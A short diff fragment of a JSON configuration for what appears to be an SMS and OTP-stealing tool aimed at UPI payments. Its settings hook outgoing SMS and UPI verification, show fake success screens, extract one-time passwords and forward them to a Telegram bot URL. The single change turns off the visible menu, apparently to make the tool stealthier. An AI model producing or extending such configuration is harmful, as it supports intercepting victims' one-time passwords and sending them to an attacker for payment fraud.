@@ -16,7 +16,7 @@
   "hook_outgoing_sms": true,
   "hook_upi_verification": true,
   "intercept_fake_success": true,
-  "always_show_menu": true,
+  "always_show_menu": false,
   "auto_extract_otp": true,
   "auto_forward_token": true,
   "forward_url": "https://api.telegram.org/bot<BOT_TOKEN>/sendMessage",
